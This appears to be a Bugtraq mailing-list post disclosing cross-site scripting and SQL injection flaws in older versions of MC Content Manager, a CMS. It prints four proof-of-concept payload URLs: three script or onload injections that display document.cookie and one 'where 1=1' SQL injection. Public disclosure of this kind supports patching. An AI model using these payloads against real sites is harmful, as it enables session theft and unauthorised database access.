Hello Bugtraq!

I want to warn you about Cross-Site Scripting and SQL Injection
vulnerabilities in MC Content Manager. Which I found in this CMS in 2007 and
2009 at the site of SZRU (Foreign Intelligence Service of Ukraine) - it's
Ukrainian special service similar to CIA and MI6 (SIS).

>From 8 vulnerabilities in CMS which I found at 08.01.2007, 23.09.2007,
30.09.2007 and 10.04.2009 (5 XSS and 3 SQLi), only 4 holes were disclosed by
me (other 4 were privately reported in September 2007 and will not be
disclosed).

XSS:

http://site/article.php?root=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E

http://site/static.php?page=1%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E

http://site/cms/%3Cbody%20onload=alert(document.cookie)%3E/

SQL Injection:

http://site/cms/ua%20where%201=1--%20/

Vulnerable are earlier versions of MC Content Manager from mc design. Last
version MC Content Manager v.10.1.1 already isn't affected.

I mentioned about these vulnerabilities at my site
(http://websecurity.com.ua/4404/).
